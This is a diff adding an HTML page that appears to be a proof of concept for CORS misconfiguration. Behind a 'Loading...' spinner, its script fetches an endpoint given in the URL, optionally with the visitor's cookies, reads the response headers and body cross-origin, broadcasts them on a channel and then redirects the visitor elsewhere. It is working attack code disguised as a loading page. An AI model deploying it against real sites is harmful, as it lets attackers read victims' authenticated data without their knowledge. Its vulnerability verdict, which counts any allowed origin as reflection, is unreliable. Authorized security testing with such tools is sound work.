@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Loading...</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { background: #fff; display: flex; align-items: center; justify-content: center; min-height: 100vh; font-family: sans-serif; }
+  .spinner { width: 32px; height: 32px; border: 3px solid #eee; border-top-color: #999; border-radius: 50%; animation: spin 0.8s linear infinite; }
+  @keyframes spin { to { transform: rotate(360deg); } }
+</style>
+</head>
+<body>
+<div class="spinner"></div>
+
+<script>
+(async () => {
+  const params = new URLSearchParams(window.location.search);
+  const endpoint  = params.get('endpoint') || '';
+  const method    = params.get('method') || 'GET';
+  const withCreds = params.get('creds') === '1';
+  const redirect  = params.get('redirect') || 'https://google.com';
+
+  const channel = new BroadcastChannel('cors_poc_channel');
+
+  const result = {
+    endpoint,
+    method,
+    withCreds,
+    timestamp: Date.now(),
+    headers: {},
+    status: null,
+    responseBody: null,
+    vulnerable: false,
+    verdict: ''
+  };
+
+  if(!endpoint){
+    result.verdict = 'No endpoint provided.';
+    channel.postMessage(result);
+    window.location.href = redirect;
+    return;
+  }
+
+  try {
+    const fetchOpts = {
+      method,
+      mode: 'cors',
+      credentials: withCreds ? 'include' : 'omit'
+    };
+
+    const res = await fetch(endpoint, fetchOpts);
+    result.status = res.status;
+
+    const interestingHeaders = [
+      'access-control-allow-origin',
+      'access-control-allow-credentials',
+      'access-control-allow-methods',
+      'access-control-allow-headers',
+      'content-type',
+      'x-frame-options'
+    ];
+
+    interestingHeaders.forEach(h => {
+      const v = res.headers.get(h);
+      if(v) result.headers[h] = v;
+    });
+
+    const acao = result.headers['access-control-allow-origin'];
+    const acac = result.headers['access-control-allow-credentials'];
+
+    if(acao && acao !== 'null' && acao !== ''){
+      result.vulnerable = true;
+      result.verdict = `CORS misconfiguration confirmed — server reflected arbitrary origin "${acao}". ` +
+        (acac === 'true' ? 'Credentials allowed — authenticated requests can be read cross-origin.' : 'Credentials flag not set.');
+    } else {
+      result.verdict = 'Not vulnerable — server did not reflect an arbitrary origin in CORS headers.';
+    }
+
+    try {
+      const text = await res.text();
+      try { result.responseBody = JSON.parse(text); }
+      catch { result.responseBody = text; }
+    } catch(e) {
+      result.responseBody = '(could not read body)';
+    }
+
+  } catch(err) {
+    result.status = 0;
+    result.verdict = 'Request blocked by browser CORS policy — not vulnerable (or endpoint unreachable). Error: ' + err.message;
+    result.vulnerable = false;
+  }
+
+  channel.postMessage(result);
+
+  await new Promise(r => setTimeout(r, 300));
+  window.location.href = redirect;
+})();
+</script>
+</body>
+</html>
